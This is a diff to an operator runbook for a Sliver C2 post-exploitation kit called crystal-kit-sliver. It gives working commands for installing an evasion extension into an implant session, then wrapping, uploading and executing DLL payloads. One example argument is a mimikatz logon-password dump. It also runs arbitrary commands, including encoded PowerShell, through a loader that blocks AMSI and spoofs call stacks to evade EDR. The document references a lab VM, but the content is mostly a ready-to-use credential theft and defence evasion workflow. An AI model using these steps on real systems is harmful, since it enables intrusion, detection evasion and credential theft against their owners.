@@ -268,46 +268,129 @@ sliver (WIN10-LAB) > whoami
 
 ---
 
-## Phase 3 — Use case B (post-ex evasion, secondary)
+## Phase 3 — Use case B: crystal command (post-ex DLL evasion)
 
-Prerequisite: an active session (from Phase 1, Phase 2, or any other vector).
+Prerequisite: an active Sliver session.
 
-### 3.1 Build a post-ex DLL
+The `crystal` command loads a PICO file from a path **on the target machine** and executes it inside the implant process. The PICO is a Crystal-Palace-wrapped DLL — XOR-masked at rest, Draugr-spoofed on load, no disk artifact beyond the PICO file itself.
 
-Either yours or a public one (e.g. a recon DLL, a credential dumper, a custom enumerator). Must be Windows x64 and export `DllMain`. Args may be empty or required depending on the DLL.
+The extension tarball `crystal-kit-sliver/sliver-glue/build/crystal-loader-0.1.0.tar.gz` contains **two DLLs**:
 
-### 3.2 Wrap with Crystal Palace
+- `crystal-loader.x64.dll` — provides the `crystal` command
+- `crystal-exec.x64.dll` — provides the `crystal-exec` command (see Phase 4)
+
+### 3.1 Install the extension (one-time per session)
+
+```
+sliver (SESSION) > extensions install ./crystal-kit-sliver/sliver-glue/build/crystal-loader-0.1.0.tar.gz
+[*] Installed extension: crystal-loader
+```
+
+### 3.2 Build a post-ex DLL on Kali
+
+Any Windows x64 DLL that exports `DllMain` and optionally uses `BeaconPrintf` / `BeaconOutput` for output. Example:
 
 ```bash
-echo "" > /tmp/empty.args   # or actual args specific to your DLL
-./crystal-kit-sliver/sliver-glue/generate.sh \
-    /path/to/postex.dll \
-    /tmp/empty.args \
-    crystal-kit-sliver/sliver-glue/build/postex.pico.bin
+x86_64-w64-mingw32-gcc -shared -o mytool.dll mytool.c
 ```
 
-Args are baked into the PICO at link time (Xenon-style `%ARGFILE`).
+### 3.3 Wrap with Crystal Palace
 
-### 3.3 Install the Sliver Extension (one-time)
-
-If not already done in Phase 1:
-
-```
-sliver (WIN10-LAB) > extensions install ./crystal-kit-sliver/sliver-glue/build/crystal-loader-0.1.0.tar.gz
+```bash
+./crystal-kit-sliver/sliver-glue/postex.sh mytool.dll
 ```
 
-### 3.4 Execute the post-ex PICO
+Output: `crystal-kit-sliver/sliver-glue/build/mytool.pico.bin`
+
+Optional: bake runtime args into the PICO at link time (Xenon-style `%ARGFILE`). If you want to supply args at execution time instead, use the `|` separator described in step 3.5.
+
+### 3.4 Upload the PICO to the target
 
 ```
-sliver (WIN10-LAB) > crystal payload=./crystal-kit-sliver/sliver-glue/build/postex.pico.bin
-[crystal-loader] executing PICO
-... (your DLL's output via BeaconPrintf)
-[crystal-loader] PICO returned
+sliver (SESSION) > upload crystal-kit-sliver/sliver-glue/build/mytool.pico.bin C:/Windows/Temp/mytool.bin
+```
+
+### 3.5 Execute
+
+```
+sliver (SESSION) > crystal --payload C:/Windows/Temp/mytool.bin
+```
+
+To pass runtime args that override the baked-in args, append them after a `|` separator:
+
+```
+sliver (SESSION) > crystal --payload C:/Windows/Temp/tool.pico.bin|sekurlsa::logonpasswords exit
+```
+
+**Path format:** always use forward slashes in the Sliver CLI. Backslashes are eaten by the Sliver argument parser.
+
+If the DLL calls `BeaconPrintf` or `BeaconOutput`, the output is forwarded to the operator console.
+
+### 3.6 Common Phase 3 failures
+
+| Symptom | Likely cause | Fix |
+|---|---|---|
+| `--payload` strips to filename only, PICO not found | `extension.json` has `"type": "file"` for the payload arg | Must be `"type": "string"` — the `file` type strips the directory path before sending |
+| PICO returns immediately with no output | DLL does not call `BeaconPrintf`/`BeaconOutput` | Output is expected; DLL may be working silently — verify via a side channel |
+| Implant crashes after PICO returns | `_ExitThread` hook in `pico.c` calls `cleanup_memory` + Draugr, freeing memory still in use | Remove `cleanup_memory` and `Draugr` calls from `_ExitThread` in `postex-loader/src/pico.c` |
+| Crystal Palace link fails | Missing `CRYSTAL_PALACE_HOME` | `export CRYSTAL_PALACE_HOME=$(pwd)/external/crystalpalace/dist` |
+
+---
+
+## Phase 4 — crystal-exec (built-in command executor)
+
+The `crystal-exec` command runs an arbitrary shell command on the target through the Crystal Palace evasion stack. No file to upload — the executor PICO is embedded inside `crystal-exec.x64.dll` at build time. Output is returned to the Sliver console via an anonymous pipe; no disk artifact is created.
+
+### 4.1 Install the extension (same tarball as Phase 3)
+
+If not already installed:
+
+```
+sliver (SESSION) > extensions install ./crystal-kit-sliver/sliver-glue/build/crystal-loader-0.1.0.tar.gz
+```
+
+Both the `crystal` and `crystal-exec` commands are registered from the same tarball.
+
+### 4.2 Run a command
+
+```
+sliver (SESSION) > crystal-exec --cmd "whoami /all"
+sliver (SESSION) > crystal-exec --cmd "net user /domain"
+sliver (SESSION) > crystal-exec --cmd "ipconfig /all"
+sliver (SESSION) > crystal-exec --cmd "powershell.exe -enc <base64>"
+```
+
+30-second timeout. The command exits cleanly after output is collected.
+
+### 4.3 What the evasion covers
+
+| Layer | What happens |
+|---|---|
+| DLL load | All API calls go through Draugr (call stack spoofed to look like legitimate Windows modules) |
+| AMSI | `amsi.dll` load is blocked at the loader level |
+| DLL at rest | DLL code is XOR-masked inside the PICO |
+| Memory cleanup | Timer-queue cleanup runs after execution |
+| Child process | The child process (`cmd.exe`) itself is **not** evaded — evasion is at the loader level |
+
+Use `crystal-exec` for operations that trigger EDR on the API calls made during DLL load (credential dumpers, injection tools). For basic recon where EDR pressure is low, a plain `shell` command is simpler.
+
+### 4.4 Rebuild crystal-exec.x64.dll (if needed)
+
+```bash
+cd crystal-kit-sliver/sliver-glue/crystal-exec
+make
+```
+
+This compiles `crystalexec.dll`, wraps it with Crystal Palace, embeds the resulting PICO as a C header, and compiles `crystal-exec.x64.dll`. Then repack the extension:
+
+```bash
+cd crystal-kit-sliver/sliver-glue
+./pack-extension.sh
 ```
 
 ---
 
-## Phase 4 — Cleanup / rollback
+## Phase 5 — Cleanup / rollback
 
 End-of-engagement:
 
@@ -317,9 +400,11 @@ sliver > sessions kill <id>
 sliver > jobs kill <id>
 ```
 
-Windows VM:
+Windows VM — remove any uploaded PICO files:
 
 ```cmd
+C:\> del C:\Windows\Temp\*.pico.bin
+C:\> del C:\Windows\Temp\*.bin
 C:\> taskkill /F /IM run.x64.exe
 ```
 
@@ -329,6 +414,7 @@ Local Kali build artifacts:
 make -C crystal-kit-sliver/loader clean
 make -C crystal-kit-sliver/postex-loader clean
 make -C crystal-kit-sliver/sliver-glue/wrapper clean
+make -C crystal-kit-sliver/sliver-glue/crystal-exec clean
 rm -rf crystal-kit-sliver/sliver-glue/build
 ```
 
